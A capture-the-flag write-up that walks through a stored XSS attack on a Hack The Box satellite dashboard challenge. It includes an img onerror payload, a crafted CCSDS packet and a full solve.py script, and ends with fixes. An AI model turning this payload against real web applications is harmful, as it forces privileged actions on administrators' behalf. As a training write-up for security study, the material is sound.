# Task: Groundstation Breach - Hack The Box (HTB) Challenge Writeup

Here is the exact step-by-step process of how this challenge was analyzed, exploited, and solved:

---

### Step 1: Target Reconnaissance
First, we analyze the running services and exposed ports:
1. **HTTP Web Service (`154.57.164.82:32383`):** A Flask web application providing a Ground Station Control Dashboard with telemetry graphs and control buttons.
2. **Raw TCP Service (`154.57.164.82:32570`):** An ingestion socket listening for raw satellite telemetry data.
3. **Admin Bot (`bot.py`):** A background script running a headless Chromium browser with admin privileges logged into the web dashboard.

---

### Step 2: Code Auditing & Finding the Vulnerability

#### 1. Finding the Goal in Backend Code (`backend/server.py`)
Looking at the backend routes:
```python
@app.route('/api/command', methods=['POST'])
def execute_command():
    if not check_admin():
        return jsonify({"error": "Admin access required"}), 403
    
    data = request.json
    command = data.get('command')
    if command == 'acquire_image':
        ...
        draw.text((x, y), text=FLAG, font=font, fill=(255, 255, 255))
        ...
        telemetry_data["images"].append(image_entry)
```
- **Discovery:** If an admin triggers `POST /api/command` with `{"command": "acquire_image"}`, the backend burns the `FLAG` onto an image (`hq.jpeg`) and saves it in `telemetry_data["images"]`.
- Regular users cannot do this directly because `check_admin()` checks for an `admin_token` cookie.

#### 2. Finding the Injection Sink in Frontend Code (`frontend/templates/index.html`)
Looking at how incoming telemetry packets are displayed in `frontend/templates/index.html`:
```javascript
if (p.ascii) {
    var asc = document.createElement('span');
    asc.className = 'pkt-ascii';
    asc.innerHTML = p.ascii; // ⚠️ SINK: HTML injection / Stored XSS
    e.appendChild(asc);
}
```
- **Discovery:** The frontend inserts `p.ascii` directly into the DOM using `innerHTML` without HTML entity encoding.

#### 3. Finding the Source in Telemetry Ingestion (`backend/server.py`)
Looking at how `p.ascii` is generated from TCP input in `backend/server.py`:
```python
ascii_data = ''.join(chr(b) if 32 <= b < 127 else '.' for b in data)
```
- **Discovery:** Printable ASCII characters (`<`, `>`, `"`, `'`, etc.) sent over the raw TCP port (32570) are placed into `ascii_data` and broadcasted to the dashboard.

---

### Step 3: Crafting the Exploit

#### 1. The XSS JavaScript Payload
We construct an `<img>` tag with an `onerror` handler to execute an authenticated `fetch` request on the admin bot's behalf:
```javascript
fetch('/api/command', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({command: 'acquire_image'})
})
```
Wrapped into an HTML tag:
```html
<img src=x onerror="fetch('/api/command',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({command:'acquire_image'})})">
```

#### 2. Wrapping in a Valid CCSDS Packet
The backend's `validate_ccsds_packet()` checks:
- `version == 0` (first 3 bits = 0)
- `pkt_type == 0` (4th bit = 0)
- `pkt_len + 7 == len(packet)` (length in bytes 4-5 + 7 equals total length)

We build the 6-byte header:
```python
payload_bytes = html_payload.encode('ascii')
pkt_len = len(payload_bytes) - 1
header = bytes([0x00, 0x01, 0x00, 0x00]) + pkt_len.to_bytes(2, 'big')
packet = header + payload_bytes
```

---

### Step 4: Execution

1. **Send the TCP packet:**
   - Open a TCP socket to `154.57.164.82:32570`.
   - Send `packet`.
2. **Wait for the Admin Bot to render:**
   - The bot receives the packet via WebSocket/polling.
   - The bot's browser parses `<img src=x onerror="...">` via `innerHTML`.
   - The `onerror` event fires and triggers `POST /api/command`.
3. **Download the Flag Image:**
   - Poll `http://154.57.164.82:32383/api/telemetry`.
   - Read the Base64 image under `images[-1]['data']`.
   - Decode the Base64 data and save it as `flag.png`.

---

### Step 5: Flag Verification
Opening the generated `flag.png` revealed the flag stamped at the bottom of the satellite capture:

```text
HTB{3v3n_1n_5p4c3_c4n7_g37_4w4y_fr0m_XSS!}
```

---

## 6. Complete Solution Script (`solve.py`)

```python
import socket
import time
import json
import urllib.request
import base64

WEB_HOST = '154.57.164.82'
WEB_PORT = 32383
TCP_PORT = 32570

def main():
    # 1. Prepare XSS payload
    js_payload = "fetch('/api/command',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({command:'acquire_image'})})"
    html_payload = f'<img src=x onerror="{js_payload}">'

    # 2. Construct CCSDS frame
    payload_bytes = html_payload.encode('ascii')
    pkt_len = len(payload_bytes) - 1
    header = bytes([0x00, 0x01, 0x00, 0x00]) + pkt_len.to_bytes(2, 'big')
    packet = header + payload_bytes

    # 3. Transmit to telemetry port
    print(f"[*] Sending payload to {WEB_HOST}:{TCP_PORT}...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((WEB_HOST, TCP_PORT))
    s.sendall(packet)
    s.close()
    print("[+] Packet sent successfully!")

    # 4. Poll for flag image
    print("[*] Waiting for admin bot to execute command...")
    for _ in range(15):
        time.sleep(1)
        try:
            req = urllib.request.urlopen(f'http://{WEB_HOST}:{WEB_PORT}/api/telemetry', timeout=3)
            data = json.loads(req.read().decode())
            images = data.get('images', [])
            if images:
                img_bytes = base64.b64decode(images[-1]['data'])
                with open('flag.png', 'wb') as f:
                    f.write(img_bytes)
                print("[+] Captured satellite image saved to flag.png!")
                break
        except Exception as e:
            print(f"[-] Polling error: {e}")

if __name__ == '__main__':
    main()
```

---

## 7. Remediation and Fixes

1. Replace `innerHTML` with `textContent` in `frontend/templates/index.html`:
   ```javascript
   var asc = document.createElement('span');
   asc.className = 'pkt-ascii';
   asc.textContent = p.ascii;
   e.appendChild(asc);
   ```
2. Implement Content Security Policy (CSP) headers to restrict script execution and API destinations.
3. Use anti-CSRF tokens or custom request validation headers for administrative endpoints.
